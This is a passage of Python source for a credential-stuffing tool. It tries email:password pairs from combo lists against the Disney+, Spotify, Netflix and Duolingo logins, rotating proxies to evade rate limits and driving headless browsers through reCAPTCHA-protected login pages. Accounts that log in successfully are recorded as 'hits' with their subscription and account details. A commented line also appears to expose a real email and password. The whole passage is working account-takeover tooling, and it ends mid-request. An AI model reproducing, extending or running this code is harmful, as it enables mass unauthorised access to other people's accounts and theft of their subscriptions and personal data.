            # df = pandas.read_csv(v['_DISNEY_COMBO_PATH_'], sep=' ', header=None)

            disney_bad_prox = []
            disney_retry = []

            async def post_DISNEY(session, i, proxy):
                try:
                    async with session.post('https://disney.api.edge.bamgrid.com/graph/v1/device/graphql', proxy=proxy,
                        headers = {
                            'Host': 'disney.api.edge.bamgrid.com',
                            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:98.0) Gecko/20100101 Firefox/98.0',
                            'Accept': 'application/json',
                            'Accept-Language': 'en-US,en;q=0.5',
                            'Accept-Encoding': 'gzip, deflate, br',
                            'Referer': 'https://www.disneyplus.com/',
                            'authorization': 'ZGlzbmV5JmJyb3dzZXImMS4wLjA.Cu56AgSfBTDag5NiRA81oLHkDZfu5L3CKadnefEAY84',
                            'content-type': 'application/json',
                            'x-bamsdk-platform-id': 'browser',
                            'x-bamtech-enhanced-pw-unsupported': 'true',
                            'x-application-version': '1.1.2',
                            'x-bamsdk-client-id': 'disney-svod-3d9324fc',
                            'x-bamsdk-platform': 'javascript/linux/firefox',
                            'x-bamsdk-version': '13.0',
                            'x-dss-edge-accept': 'vnd.dss.edge+json; version=2',
                            #'Content-Length': '591',
                            'Origin': 'https://www.disneyplus.com',
                            'DNT': '1',
                            'Connection': 'keep-alive',
                            'Sec-Fetch-Dest': 'empty',
                            'Sec-Fetch-Mode': 'cors',
                            'Sec-Fetch-Site': 'cross-site',
                            'Sec-GPC': '1',
                        },
                        data = b'{"query":"mutation registerDevice($input: RegisterDeviceInput!) {\\n            registerDevice(registerDevice: $input) {\\n                grant {\\n                    grantType\\n                    assertion\\n                }\\n            }\\n        }","operationName":"registerDevice","variables":{"input":{"deviceFamily":"browser","applicationRuntime":"firefox","deviceProfile":"linux","deviceLanguage":"en-US","attributes":{"osDeviceIds":[],"manufacturer":"linux","model":null,"operatingSystem":"linux","operatingSystemVersion":"x86_64","browserName":"firefox","browserVersion":"98.0"}}}}'
                    ) as resp_0:
                        try:
                            auth_dn = await resp_0.text()
                        except:
                            print('authdnerr')
                            return
                        try:
                        # print('check1')
                        # print(resp_0.text)
                        #print(auth_dn)
                            auth_dn = ujson.loads(auth_dn)['extensions']['sdk']['token']['accessToken']
                        except BaseException as e:
                            w['_DISNEY_ERROR_'].update(int(w['_DISNEY_ERROR_'].get())+1)
                            w['_FALSE_DISNEY_'].update('Bad account: {}:{} - Error: Cloudflare Error'.format(i[0], i[1]))
                            disney_bad_prox.append(proxy)
                            disney_retry.append(i)
                            return
                        #print(auth_dn)
                        #print('check2')
                
                        async with session.post(
                            'https://disney.api.edge.bamgrid.com/v1/public/graphql', proxy=proxy,
                            headers = {
                                'Host': 'disney.api.edge.bamgrid.com',
                                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:98.0) Gecko/20100101 Firefox/98.0',
                                'Accept': 'application/json',
                                'Accept-Language': 'en-US,en;q=0.5',
                                'Accept-Encoding': 'gzip, deflate, br',
                                'Referer': 'https://www.disneyplus.com/',
                                'authorization': auth_dn,
                                'content-type': 'application/json',
                                'x-bamsdk-platform-id': 'browser',
                                'x-bamtech-enhanced-pw-unsupported': 'true',
                                'x-application-version': '1.1.2',
                                'x-bamsdk-client-id': 'disney-svod-3d9324fc',
                                'x-bamsdk-platform': 'javascript/linux/firefox',
                                'x-bamsdk-version': '13.0',
                                'x-dss-edge-accept': 'vnd.dss.edge+json; version=2',
                                #'Content-Length': '5012',
                                'Origin': 'https://www.disneyplus.com',
                                'DNT': '1',
                                'Connection': 'keep-alive',
                                'Sec-Fetch-Dest': 'empty',
                                'Sec-Fetch-Mode': 'cors',
                                'Sec-Fetch-Site': 'cross-site',
                                'Sec-GPC': '1',
                                'TE': 'trailers',
                            }, data = bytes(ujson.dumps(
                                {
                                    "query": "\n    mutation login($input: LoginInput!) {\n        login(login: $input) {\n            account {\n                ...account\n\n                profiles {\n                    ...profile\n                }\n            }\n            identity {\n                ...identity\n            }\n            actionGrant\n        }\n    }\n\n    \nfragment identity on Identity {\n    attributes {\n        securityFlagged\n        createdAt\n    }\n    flows {\n        marketingPreferences {\n            eligibleForOnboarding,\n            isOnboarded\n        }\n    }\n    subscriber {\n        subscriberStatus\n        subscriptionAtRisk\n        overlappingSubscription\n        doubleBilled\n        doubleBilledProviders\n        subscriptions {\n            id\n            groupId\n            state\n            partner\n            isEntitled\n            source {\n                sourceType\n                sourceProvider\n                sourceRef\n                subType\n            }\n            paymentProvider\n            product {\n                id\n                sku\n                offerId\n                promotionId\n                name\n                entitlements {\n                    id\n                    name\n                    desc\n                    partner\n                }\n                categoryCodes\n                redeemed {\n                    campaignCode\n                    redemptionCode\n                    voucherCode\n                }\n                bundle\n                bundleType\n                subscriptionPeriod\n                earlyAccess\n                trial {\n                    duration\n                }\n            }\n            term {\n                purchaseDate\n                startDate\n                expiryDate\n                nextRenewalDate\n                pausedDate\n                churnedDate\n                isFreeTrial\n            }\n            cancellation {\n                type\n                restartEligible\n            }\n            stacking {\n                status\n                overlappingSubscriptionProviders\n                previouslyStacked\n                previouslyStackedByProvider\n            }\n        }\n    }\n}\n\n    \nfragment account on Account {\n    id\n    attributes {\n        blocks {\n            expiry\n            reason\n        }\n        consentPreferences {\n            dataElements {\n                name\n                value\n            }\n            purposes {\n                consentDate\n                firstTransactionDate\n                id\n                lastTransactionCollectionPointId\n                lastTransactionCollectionPointVersion\n                lastTransactionDate\n                name\n                status\n                totalTransactionCount\n                version\n            }\n        }\n        dssIdentityCreatedAt\n        email\n        emailVerified\n        lastSecurityFlaggedAt\n        locations {\n            manual {\n                country\n            }\n            purchase {\n                country\n                source\n            }\n            registration {\n                geoIp {\n                    country\n                }\n            }\n        }\n        securityFlagged\n        tags\n        taxId\n        userVerified\n    }\n    parentalControls {\n        isProfileCreationProtected\n    }\n    flows {\n        star {\n            isOnboarded\n        }\n    }\n}\n\n    \nfragment profile on Profile {\n    id\n    name\n    isAge21Verified\n    attributes {\n        avatar {\n            id\n            userSelected\n        }\n        isDefault\n        kidsModeEnabled\n        languagePreferences {\n            appLanguage\n            playbackLanguage\n            preferAudioDescription\n            preferSDH\n            subtitleAppearance {\n                backgroundColor\n                backgroundOpacity\n                description\n                font\n                size\n                textColor\n            }\n            subtitleLanguage\n            subtitlesEnabled\n        }\n        groupWatch {\n            enabled\n        }\n        parentalControls {\n            kidProofExitEnabled\n            isPinProtected\n        }\n        playbackSettings {\n            autoplay\n            backgroundVideo\n            prefer133\n            preferImaxEnhancedVersion\n            previewAudioOnHome\n            previewVideoOnHome\n        }\n    }\n    maturityRating {\n        ...maturityRating\n    }\n    flows {\n        star {\n            eligibleForOnboarding\n            isOnboarded\n        }\n    }\n}\n\n\nfragment maturityRating on MaturityRating {\n    ratingSystem\n    ratingSystemValues\n    contentMaturityRating\n    maxRatingSystemValue\n    isMaxContentMaturityRating\n}\n\n\n",
                                    "operationName": "login",
                                    "variables": {
                                        "input": {
                                            "email": i[0],
                                            "password": i[1],
                                        }
                                    }
                                }
                            ), 'utf-8')
                        ) as resp:
                            try:
                                a = await resp.text()
                                #print(i, a)
                                if '"code": "throttled"' in a:
                                    w['_DISNEY_ERROR_'].update(int(w['_DISNEY_ERROR_'].get())+1)
                                    w['_FALSE_DISNEY_'].update('Bad account: {}:{} - Error: Throttled'.format(i[0], i[1]))
                                    disney_bad_prox.append(proxy)
                                    disney_retry.append(i)
                                    return
                            except:
                                print('resptxterr')
                                return
                            try:
                                a = ujson.loads(a)
                                error = a['extensions']['operation']['operations'][0]['errorCode']
                            except:
                                print('ujsonloadserr', i)
                                return
                            if error != None:
                                w['_DISNEY_FALSE_'].update(int(w['_DISNEY_FALSE_'].get())+1)
                                w['_FALSE_DISNEY_'].update('Bad account: {}:{} - Error:{}'.format(i[0], i[1], error))
                            else:
                                try:
                                    sub = a['data']['login']['identity']['subscriber']
                                    atr = a['data']['login']['account']['attributes']
                                except BaseException as e:
                                    print('subatrerr',e)
                                    return
                                try:
                                    if sub == None:
                                        w['_DISNEY_FREE_'].update(int(w['_DISNEY_FREE_'].get())+1)
                                        w['_FREE_DISNEY_'].update('\n'+i[0]+
                                            ' | id={} | parentalControl={} | country={} | accountCreation={} | emailVerified={} | userVerified={} | securityFlag={}'.format(a['data']['login']['account']['id'], a['data']['login']['account']['parentalControls']['isProfileCreationProtected'], atr['locations']['registration']['geoIp']['country'],
                                            atr['dssIdentityCreatedAt'], atr['emailVerified'], atr['userVerified'], atr['securityFlagged'])
                                        +w['_FREE_DISNEY_'].get())
                                    else:
                                        if sub['subscriptions'] == []:
                                            w['_FREE_DISNEY_'].update('\n'+i[0]+
                                                ' | id={} | parentalControl={} | country={} | accountCreation={} | emailVerified={} | userVerified={} | securityFlag={}'.format(a['data']['login']['account']['id'], a['data']['login']['account']['parentalControls']['isProfileCreationProtected'], atr['locations']['registration']['geoIp']['country'],
                                                atr['dssIdentityCreatedAt'], atr['emailVerified'], atr['userVerified'], atr['securityFlagged'])
                                            +w['_FREE_DISNEY_'].get())
                                        else:
                                            w['_DISNEY_HITS_'].update(int(w['_DISNEY_HITS_'].get())+1)
                                            w['_OUT_DISNEY_'].update('\n'+i[0]+
                                                ' | id={} | parentalControl={} | country={} | status={} | atRisk={} | freeTrial={} | subscription={} | entitlements={} | accountCreation={} | purchasedOn={} | expiresOn={} | nextRenewal={} | emailVerified={} | userVerified={} | securityFlag={}'.format(a['data']['login']['account']['id'], a['data']['login']['account']['parentalControls']['isProfileCreationProtected'], atr['locations']['registration']['geoIp']['country'], sub['subscriberStatus'], sub['subscriptionAtRisk'], sub['subscriptions'][0]['term']['isFreeTrial'],
                                                #','.join([x['product']['name'] for x in sub['subscriptions']]),
                                                sub['subscriptions'][0]['product']['name'],
                                                ','.join(
                                                    [
                                                        ','.join([y['desc'] for y in x['product']['entitlements']]) for x in sub['subscriptions']
                                                    ]
                                                ),
                                                atr['dssIdentityCreatedAt'], sub['subscriptions'][0]['term']['purchaseDate'], sub['subscriptions'][0]['term']['expiryDate'], sub['subscriptions'][0]['term']['nextRenewalDate'], atr['emailVerified'], atr['userVerified'], atr['securityFlagged'])
                                            +w['_OUT_DISNEY_'].get())
                                except BaseException as e:
                                    print(i, e, 'asrdtyy')
                                    return
                except aiohttp.ServerConnectionError:
                    print('serverr')
                    w['_DISNEY_ERROR_'].update(int(w['_DISNEY_ERROR_'].get())+1)
                    w['_FALSE_DISNEY_'].update('Bad account: {}:{} - Error: Server Error'.format(i[0], i[1]))
                    return
                except asyncio.TimeoutError:
                    print('timeouterr')
                    w['_DISNEY_ERROR_'].update(int(w['_DISNEY_ERROR_'].get())+1)
                    w['_FALSE_DISNEY_'].update('Bad account: {}:{} - Error: Timeout Error'.format(i[0], i[1]))
                    return
                except aiohttp.ClientHttpProxyError:
                    print('httproxer')
                    #print(disney_bad_prox)
                    disney_bad_prox.append(proxy)
                    disney_retry.append(i)
                    
                    w['_DISNEY_ERROR_'].update(int(w['_DISNEY_ERROR_'].get())+1)
                    w['_FALSE_DISNEY_'].update('Bad account: {}:{} - Error: Proxy Error'.format(i[0], i[1]))
                    return
                except aiohttp.ClientSSLError:
                    print('sslerr1')
                    w['_DISNEY_ERROR_'].update(int(w['_DISNEY_ERROR_'].get())+1)
                    w['_FALSE_DISNEY_'].update('Bad account: {}:{} - Error: SSL Error'.format(i[0], i[1]))
                    return
                except aiohttp.ClientError as e:

                    print('err1', e)
                    w['_DISNEY_ERROR_'].update(int(w['_DISNEY_ERROR_'].get())+1)
                    w['_FALSE_DISNEY_'].update('Bad account: {}:{} - Error: {}'.format(i[0], i[1], str(e).replace('disney.api.edge.bamgrid.com','')))
                    return
                except:
                    print('idkerror')
                    return

            async def async_check_DISNEY():
                async with aiohttp.ClientSession(timeout = aiohttp.ClientTimeout(v['_DISNEY_TIME_']), connector_owner=False) as session:
                    
                    #with open(v['_DISNEY_COMBO_PATH_']) as f, conditional_open(v['_DISNEY_PROX_PATH_'], 'r', v['_DISNEY_USE_PROX_']) as p:
                    #for k in df:
                    with open(v['_DISNEY_COMBO_PATH_']) as f:
                        DISNEY_continue_check = True
                        while DISNEY_continue_check:
                            tasks = []
                            for k in range(v['_DISNEY_CHUNKS_']):
                                i = f.readline()[:-1].split(':', 1)
                                #i = j[1][0].split(':', 1) 
                                
                                if v['_DISNEY_USE_PROX_']:
                                    b=proxy_list.sample()[0].tolist()[0]
                                    prox = protocol + '://' + b
                                    if prox in disney_bad_prox:
                                        b=proxy_list.sample()[0].tolist()[0]
                                        prox = protocol + '://' + b
                                        if prox in disney_bad_prox:
                                            b=proxy_list.sample()[0].tolist()[0]
                                            prox = protocol + '://' + b
                                            if prox in disney_bad_prox:
                                                b=proxy_list.sample()[0].tolist()[0]
                                                prox = protocol + '://' + b
                                else: prox = None
                                    #if a in disney_bad_prox:
                                if len(i) == 2:
                                    tasks.append(asyncio.ensure_future(post_DISNEY(session, i, prox)))
                                if i == ['']:
                                    DISNEY_continue_check = False
                                    #await brainfm_btns()
                            total = await asyncio.gather(*tasks)
                async def DISNEY_btns():
                    print('checked all')
                    w['_FALSE_DISNEY_'].update(
                        'Unchecked due to proxy errors:\n'+'\n'.join(['{}:{}'.format(x[0], x[1]) for x in disney_retry])
                    )
                    w['_START_DISNEY_'].update(disabled=False)
                    w['_STOP_DISNEY_'].update(disabled=True)
                    loop.call_soon_threadsafe(loop.stop)
                    t.join()
                await DISNEY_btns()
                        # tasks = []
                        # for j in k.iterrows():
                        #     i = j[1][0].split(':', 1)
                            
                        #     if len(i) != 2:
                        #         print('bad line:', j)
                        #         continue
                            
                        #     if is_use_prox:
                        #         b=proxy_list.sample()[0].tolist()[0]
                        #         prox = protocol + '://' + b
                        #         if prox in disney_bad_prox:
                        #             b=proxy_list.sample()[0].tolist()[0]
                        #             prox = protocol + '://' + b
                        #             if prox in disney_bad_prox:
                        #                 b=proxy_list.sample()[0].tolist()[0]
                        #                 prox = protocol + '://' + b
                        #                 if prox in disney_bad_prox:
                        #                     b=proxy_list.sample()[0].tolist()[0]
                        #                     prox = protocol + '://' + b
                        #     else: prox = None

                        #     tasks.append(asyncio.ensure_future(post_DISNEY(session, i, prox)))
                        #     #else:tasks.append(asyncio.ensure_future(post_DISNEY(session, i, None)))

                        # total = await asyncio.gather(*tasks)
                    #await session.close()
                # async def DISNEY_btns():
                #     print('checked all')
                #     w['_FALSE_DISNEY_'].update(
                #         'Unchecked due to proxy errors:\n'+'\n'.join(['{}:{}'.format(x[0], x[1]) for x in disney_retry])
                #     )
                #     w['_START_DISNEY_'].update(disabled=False)
                #     w['_STOP_DISNEY_'].update(disabled=True)
                #     loop.call_soon_threadsafe(loop.stop)
                #     t.join()
                # await DISNEY_btns()
                # asyncio.run_coroutine_threadsafe(async_check_DISNEY(pandas.DataFrame(disney_retry), proxy_list, protocol, v['_DISNEY_USE_PROX_']), loop)
                # disney_retry = []
                # print('disney retried')

            # if len(df)<=v['_DISNEY_CHUNKS_']:
            #     asyncio.run_coroutine_threadsafe(async_check_DISNEY([df], proxy_list, protocol, v['_DISNEY_USE_PROX_']), loop)
            # else:
            asyncio.run_coroutine_threadsafe(async_check_DISNEY(), loop)
        
        if e == '_STOP_DISNEY_':
            loop.call_soon_threadsafe(loop.stop)
            t.join()
            w['_START_DISNEY_'].update(disabled=False)
            w['_STOP_DISNEY_'].update(disabled=True)
#endregion

#region Spotify Logic
        if e == '_START_SPOTIFY_':
            isSpotifyQuit = False
            w['_START_SPOTIFY_'].update(disabled=True)
            w['_STOP_SPOTIFY_'].update(disabled=False)
            # loop = asyncio.new_event_loop()
            # t = Thread(target=asyncloop, args=(loop,), daemon=True)
            # t.start()
            w['_OUT_SPOTIFY_'].update('')
            df = pandas.read_csv(v['_SPOTIFY_COMBO_PATH_'], sep=' ', header=None)
            
            protocol = 'https' if '_HTTPS_' in [x for x in ['_SPOTIFY_HTTP_PROX_', '_SPOTIFY_HTTPS_PROX_'] if v[x] == True][0] else 'http'
            if v['_SPOTIFY_USE_PROX_']:
                proxy_list = pandas.read_csv(v['_SPOTIFY_PROX_PATH_'], sep=' ', header=None)
            else: proxy_list = None

            SPOTIFY_bad_prox = []
            SPOTIFY_retry = []    

            # def sp_check(acc, prox, protocol):
                
            #     if prox == None: slt_opt = {}
            #     else:
            #         slt_opt = {
            #             'proxy': {
            #                 '{}'.format(protocol): protocol+'://'+prox,
            #             }
            #         }
            #     driver = Chrome(
            #     service = ser,
            #     options=options,
            #     seleniumwire_options=slt_opt,
            #     )
            #     driver.get("https://accounts.spotify.com/login/")
            #     driver.find_element(By.ID, 'login-username').send_keys(acc[0])
            #     driver.find_element(By.ID, 'login-password').send_keys(acc[1])
            #     b = driver.find_element(By.ID, 'login-button')
                
            #     WebDriverWait(driver, 30).until(
            #         EC.frame_to_be_available_and_switch_to_it((By.XPATH, "//iframe[starts-with(@name, 'a-') and starts-with(@src, 'https://www.google.com/recaptcha')]")),
            #     )
            #     driver._switch_to.default_content()

            #     b.click()

            #     a = WebDriverWait(driver, 30).until(
            #         EC.any_of(
            #             EC.staleness_of(b),
            #             EC.visibility_of_element_located((By.CSS_SELECTOR, "[aria-live=assertive]"))
            #         )
            #     )

            #     if type(a)==bool:
            #         a = driver.find_element(By.XPATH, '//*[@id="root"]/div/div[2]/div/div/div[1]/div/p').text
            #         s = requests.Session()
            #         selenium_user_agent = driver.execute_script("return navigator.userAgent;")
            #         s.headers.update({"user-agent": selenium_user_agent})
            #         for cookie in driver.get_cookies():
            #             s.cookies.set(cookie['name'], cookie['value'], domain=cookie['domain'])
            #         response = s.get('https://www.spotify.com/us/api/account/datalayer/')
            #         print(response.json(), a)
            #     else:
            #         print('bad:', acc)
            #     driver.quit()
            
            def selenium_test(acc, prox, protocol):
                while not isSpotifyQuit:
                    ser = Service(r'chromium\app\chromedriver.exe')
                    options = Options()
                    options.add_argument('--incognito')
                    options._binary_location = r'chromium\app\chrome.exe'
                    options.headless = True
                    options.page_load_strategy = "eager"
                    options.add_experimental_option('excludeSwitches', ['enable-logging'])

                    if prox == None: slt_opt = {}
                    else:
                        slt_opt = {
                            'proxy': {
                                str(protocol): prox,
                            }
                        }            
                    driver = Chrome(
                        service = ser,
                        options=options,
                        seleniumwire_options=slt_opt,
                    )

                    try:
                        
                        driver.get("https://accounts.spotify.com/login/")
                        driver.find_element(By.ID, 'login-username').send_keys(acc[0])
                        driver.find_element(By.ID, 'login-password').send_keys(acc[1])
                        b = driver.find_element(By.ID, 'login-button')
                        
                        WebDriverWait(driver, 30).until(
                            EC.frame_to_be_available_and_switch_to_it((By.XPATH, "//iframe[starts-with(@name, 'a-') and starts-with(@src, 'https://www.google.com/recaptcha')]")),
                        )
                        driver._switch_to.default_content()

                        b.click()

                        a = WebDriverWait(driver, 30).until(
                            EC.any_of(
                                EC.staleness_of(b),
                                EC.visibility_of_element_located((By.CSS_SELECTOR, "[aria-live=assertive]"))
                            )
                        )

                        if type(a)==bool:
                            a = driver.find_element(By.XPATH, '//*[@id="root"]/div/div[2]/div/div/div[1]/div/p').text
                            s = requests.Session()
                            selenium_user_agent = driver.execute_script("return navigator.userAgent;")
                            s.headers.update({"user-agent": selenium_user_agent})
                            for cookie in driver.get_cookies():
                                s.cookies.set(cookie['name'], cookie['value'], domain=cookie['domain'])
                            response = s.get('https://www.spotify.com/us/api/account/datalayer/')
                            #print(response.json(), a)
                            b = '{}:{}'.format(acc[0], acc[1])
                            for i in list(response.json().items()):
                                b += ' | '+str(i[0])+'='+str(i[1])
                            b+=' | {}'.format(a)
                            
                            w['_SPOTIFY_HITS_'].update(int(w['_SPOTIFY_HITS_'].get())+1)
                            w['_OUT_SPOTIFY_'].print(
                                b
                            )

                        else:
                            w['_SPOTIFY_FALSE_'].update(int(w['_SPOTIFY_FALSE_'].get())+1)
                            w['_FALSE_SPOTIFY_'].update('Bad account: {}:{}'.format(acc[0], acc[1]))
                        return driver.quit()
                    except Exception as e:
                        w['_SPOTIFY_ERROR_'].update(int(w['_SPOTIFY_ERROR_'].get())+1)
                        w['_FALSE_SPOTIFY_'].update('Bad account: {}:{} | Error={}'.format(acc[0], acc[1],str(e)))
                        return

            # default number of threads is optimized for cpu cores 
            # but you can set with `max_workers` like `futures.ThreadPoolExecutor(max_workers=...)`
            #drivers = dict.fromkeys(range(v['_SPOTIFY_THREADS_']))
            future_test_results = []
            loop = asyncio.new_event_loop()

            executor = futures.ThreadPoolExecutor(v['_SPOTIFY_THREADS_'])
            for j in df.iterrows():
                i = j[1][0].split(':', 1)
                        
                if len(i) != 2:
                    print('bad line:', i)
                    continue
                
                if v['_SPOTIFY_USE_PROX_']:
                    b=proxy_list.sample()[0].tolist()[0]
                    prox = protocol + '://' + b
                    if prox in disney_bad_prox:
                        b=proxy_list.sample()[0].tolist()[0]
                        prox = protocol + '://' + b
                        if prox in disney_bad_prox:
                            b=proxy_list.sample()[0].tolist()[0]
                            prox = protocol + '://' + b
                            if prox in disney_bad_prox:
                                b=proxy_list.sample()[0].tolist()[0]
                                prox = protocol + '://' + b
                else: prox = None
                loop.run_in_executor(executor, selenium_test, i, prox, protocol)
                #future_test_results.append(executor.submit(selenium_test, i, prox, protocol))
            def asyncloopedit(loop):
                asyncio.set_event_loop(loop)
                loop.run_until_complete(asyncio.gather(*asyncio.all_tasks(loop)))
                # async def done():
                #     print('d')
                # await done()

            t = Thread(target=asyncloopedit, args=(loop,), daemon=True)
            #t = Thread(target=asyncio.run, args=(asyncloopedit(loop),), daemon=True)
            t.start()
            
            # for future_test_result in future_test_results: 
            #     try:        
            #         test_result = future_test_result.result() # can use `timeout` to wait max seconds for each thread               
            #         #... do something with the test_result
            #     except BaseException as exc: # can give a exception in some thread, but 
            #         print(exc)
            executor.shutdown(wait=False)

            #executor = ThreadPoolExecutor(v['_SPOTIFY_THREADS_'])

            # for j in df.iterrows():
            #     i = j[1][0].split(':', 1)
                        
            #     if len(i) != 2:
            #         print('bad line:', i)
            #         continue
                
            #     if v['_SPOTIFY_USE_PROX_']:
            #         b = proxy_list.sample()[0].tolist()[0]
            #         prox = protocol + '://' + b
            #     else: prox = None
                
            #     loop.run_in_executor(executor, sp_check, i, prox, protocol)

            # loop.run_until_complete(asyncio.gather(*asyncio.all_tasks(loop)))

            # for k in divide_chunks(df, v['_SPOTIFY_THREADS_']):
            #     #tasks = []
            #     for j in k.iterrows():
            #         i = j[1][0].split(':', 1)
                            
            #         if len(i) != 2:
            #             print('bad line:', i)
            #             continue
                    
            #         if v['_SPOTIFY_USE_PROX_']:
            #             b = proxy_list.sample()[0].tolist()[0]
            #             prox = protocol + '://' + b
            #         else: prox = None
                    #tasks.append(Thread(target=sp_check, args=(i, prox, protocol)))

                #     print(i, prox)
                # print('------start--------')
                # for i in tasks: i.start()
                # for i in tasks: i.join()
                # print('------done--------')

        if e == '_STOP_SPOTIFY_':
            isSpotifyQuit = True
            loop.call_soon_threadsafe(loop.stop)
            t.join()
            w['_START_SPOTIFY_'].update(disabled=False)
            w['_STOP_SPOTIFY_'].update(disabled=True)
#endregion

#region Netflix Logic
        if e == '_START_NETFLIX_':
            isNetflixQuit = False
            w['_START_NETFLIX_'].update(disabled=True)
            w['_STOP_NETFLIX_'].update(disabled=False)
            w['_OUT_NETFLIX_'].update('')
            df = pandas.read_csv(v['_NETFLIX_COMBO_PATH_'], sep=' ', header=None)
            
            protocol = 'https' if '_HTTPS_' in [x for x in ['_NETFLIX_HTTP_PROX_', '_NETFLIX_HTTPS_PROX_'] if v[x] == True][0] else 'http'
            if v['_NETFLIX_USE_PROX_']:
                proxy_list = pandas.read_csv(v['_NETFLIX_PROX_PATH_'], sep=' ', header=None)
            else: proxy_list = None 

            def selenium_test(acc, prox, protocol):
                while not isNetflixQuit:
                    ser = Service(r'chromium\app\chromedriver.exe')
                    options = Options()
                    options.add_argument('--incognito')
                    options._binary_location = r'chromium\app\chrome.exe'
                    options.headless = True
                    options.page_load_strategy = "eager"
                    options.add_experimental_option('excludeSwitches', ['enable-logging'])

                    if prox == None: slt_opt = {}
                    else:
                        slt_opt = {
                            'proxy': {
                                str(protocol): prox,
                            }
                        }                
                    driver = Chrome(
                        service = ser,
                        options=options,
                        seleniumwire_options=slt_opt,
                    )

                    try:
                        driver.get("https://www.netflix.com/login")
                        driver.find_element(By.ID, 'id_userLoginId').send_keys(acc[0])
                        driver.find_element(By.ID, 'id_password').send_keys(acc[1])
                        b = driver.find_element(By.CLASS_NAME, 'login-button')
                        b.click()
                        
                        a = WebDriverWait(driver, 30).until(
                            EC.any_of(
                                EC.visibility_of_element_located((By.CLASS_NAME, 'profile-button')),
                                EC.visibility_of_element_located((By.XPATH, '/html/body/div[1]/div/div[3]/div/div/div[1]/div/div[2]'))
                            )
                        )

                        if "Sorry, we can't find an account" in a.text:
                            w['_NETFLIX_FALSE_'].update(int(w['_NETFLIX_FALSE_'].get())+1)
                            w['_FALSE_NETFLIX_'].update('Incorrect password - {}:{}'.format(acc[0], acc[1]))
                        elif 'Incorrect password' in a.text:
                            w['_NETFLIX_EXIST_'].update(int(w['_NETFLIX_EXIST_'].get())+1)
                            w['_FALSE_NETFLIX_'].update('Incorrect password - {}:{}'.format(acc[0], acc[1]))
                        elif 'We are having technical difficulties' in a.text:
                            w['_NETFLIX_ERROR_'].update(int(w['_NETFLIX_ERROR_'].get())+1)
                            w['_FALSE_NETFLIX_'].update('Bad account: {}:{} | Error=IP Ban'.format(acc[0], acc[1]))
                        else:
                            w['_NETFLIX_HITS_'].update(int(w['_NETFLIX_HITS_'].get())+1)
                            w['_OUT_NETFLIX_'].print('{}:{}'.format(acc[0], acc[1]))
                        return driver.quit()
                    except Exception as e:
                        w['_NETFLIX_ERROR_'].update(int(w['_NETFLIX_ERROR_'].get())+1)
                        w['_FALSE_NETFLIX_'].update('Bad account: {}:{} | Error={}'.format(acc[0], acc[1],str(e)))
                        return

            loop = asyncio.new_event_loop()

            executor = futures.ThreadPoolExecutor(v['_NETFLIX_THREADS_'])
            
            for j in df.iterrows():
                i = j[1][0].split(':', 1)
                        
                if len(i) == 2:
                
                    if v['_NETFLIX_USE_PROX_']:
                        b=proxy_list.sample()[0].tolist()[0]
                        prox = protocol + '://' + b
                        if prox in disney_bad_prox:
                            b=proxy_list.sample()[0].tolist()[0]
                            prox = protocol + '://' + b
                            if prox in disney_bad_prox:
                                b=proxy_list.sample()[0].tolist()[0]
                                prox = protocol + '://' + b
                                if prox in disney_bad_prox:
                                    b=proxy_list.sample()[0].tolist()[0]
                                    prox = protocol + '://' + b
                    else: prox = None
                    loop.run_in_executor(executor, selenium_test, i, prox, protocol)
                
            def asyncloopedit(loop):
                asyncio.set_event_loop(loop)
                loop.run_until_complete(asyncio.gather(*asyncio.all_tasks(loop)))

            t = Thread(target=asyncloopedit, args=(loop,), daemon=True)
            t.start()
            
            executor.shutdown(wait=False)

        if e == '_STOP_NETFLIX_':
            isNetflixQuit = True
            loop.call_soon_threadsafe(loop.stop)
            t.join()
            w['_START_NETFLIX_'].update(disabled=False)
            w['_STOP_NETFLIX_'].update(disabled=True)
#endregion

#region Duolingo Logic
        if e == '_START_DUOLING_':
            
            w['_START_DUOLING_'].update(disabled=True)
            w['_STOP_DUOLING_'].update(disabled=False)
            loop = asyncio.new_event_loop()
            t = Thread(target=asyncloop, args=(loop,), daemon=True)
            t.start()
            w['_OUT_DUOLING_'].update('')
            # df = pandas.read_csv(v['_DUOLING_COMBO_PATH_'], sep=' ', header=None)
            
            protocol = 'https' if '_HTTPS_' in [x for x in ['_DUOLING_HTTP_PROX_', '_DUOLING_HTTPS_PROX_'] if v[x] == True][0] else 'http'
            if v['_DUOLING_USE_PROX_']:
                proxy_list = pandas.read_csv(v['_DUOLING_PROX_PATH_'], sep=' ', header=None)
            else: proxy_list = None

            duoling_bad_prox = []
            duoling_retry = []

            #user, pwd = 'pacharles1048@gmail.com','Spiderman10!'

            async def post_DUOLING(session, id, i, proxy):
                try:
                    async with session.post('https://android-api-cf.duolingo.com/2017-06-30/login?fields=id', proxy=proxy,
                        headers = {
                            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:99.0) Gecko/20100101 Firefox/99.0',
                            'Content-Type': 'application/json',
                        },
                        data = bytes(ujson.dumps({
                            "distinctId":id,
                            "identifier":i[0],
                            "password":i[1]
                        }), 'utf-8')
                    ) as resp_0:
                        try:
                            auth_dl = await resp_0.text()
                            if 'Too many requests' in auth_dl:
                                #print('ban')
                                w['_DUOLING_ERROR_'].update(int(w['_DUOLING_ERROR_'].get())+1)
                                w['_FALSE_DUOLING_'].update('Bad account: {}:{} - Error: SSL Error'.format(i[0], i[1]))
                                return
                            auth_dl = ujson.loads(auth_dl)
                        except BaseException as e:
                            print('error125',e)
                            return
                        print(auth_dl)
                        if auth_dl == {}:
                            w['_DUOLING_FALSE_'].update(int(w['_DUOLING_FALSE_'].get())+1)
                            w['_FALSE_DUOLING_'].update('Account does not exist: {}:{}'.format(i[0], i[1]))
                        else:
                            try:
                                id = auth_dl['id']
                                jwt = session.cookie_jar.filter_cookies('https://android-api-cf.duolingo.com').get('jwt_token').value
                            except:
                                print('idjwterr', i)
                                return

                            async with session.patch(
